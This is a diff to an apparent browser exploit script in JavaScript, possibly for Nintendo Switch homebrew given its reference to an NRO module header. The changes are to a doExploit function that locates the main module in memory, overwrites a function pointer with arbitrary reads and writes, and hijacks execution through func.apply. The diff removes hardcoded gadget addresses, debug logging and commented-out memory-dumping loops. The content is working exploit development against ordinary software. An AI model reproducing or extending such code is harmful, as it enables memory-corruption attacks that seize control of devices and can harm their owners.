@@ -243,8 +243,6 @@ function doExploit(buf, stale, temp) {
 	function setjmp() {
 		var mainaddr = walkList();
 		log('Main module at ' + paddr(mainaddr));
-		var justret = 0x00433F78;
-		var setjmp  = 0x00433EE0;
 		var test = 0x39FEEC;
 		var jaddr = add2(mainaddr, test);
 		log('New jump at ' + paddr(jaddr));
@@ -269,12 +267,8 @@ function doExploit(buf, stale, temp) {
 		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
 
 		log('Assigned.  Jumping.');
-		alert('Trying to setjmp...');
 		var ret = func.apply(0x101);
-		log('Setjmp!');
-
-		log('After?');
-		log('...');
+		log('Jumped.  Look at the stack.');
 
 		var saddr = getAddr(ret);
 		log(paddr(saddr));
@@ -284,40 +278,6 @@ function doExploit(buf, stale, temp) {
 	}
 
 	setjmp();
-
-	/*buf[4] = lo = 0x492cb000 >>> 0;
-	buf[5] = hi = 0x60;
-	buf[6] = 0xFFFFFFFF;
-
-	if(temp[4] != 0x304f524e) {
-		log('Something is wrong.  No NRO header at base.');
-		return;
-	}
-
-	var size = temp[0x18 >> 2] + temp[0x38 >> 2];
-	lo = (lo + 1024 * 1024) >>> 0;
-	buf[4] = lo;
-	log('Total size of new module: 0x' + size.toString(16));
-	memdump(lo, hi, temp, (size - 1024 * 1024) >> 2);*/
-
-	/*var ctr = 0;
-	for(var i = 0; i < 901; ++i) {
-		buf[4] = lo;
-		buf[5] = hi;
-		buf[6] = 65536;
-		memdump(lo, hi, temp, 65536 >> 2);
-
-		if(temp[4] == 0x304F524E) {
-			log('Beginning');
-		}
-
-		if(lo >= 0xFFFF0000) {
-			hi += 1;
-			lo = (((lo + 0x10000) >>> 0) & 0xFFFF0000) >>> 0;
-		} else {
-			lo = (lo + 0x10000) >>> 0;
-		}
-	}*/
 }
 
 function doItAll() {
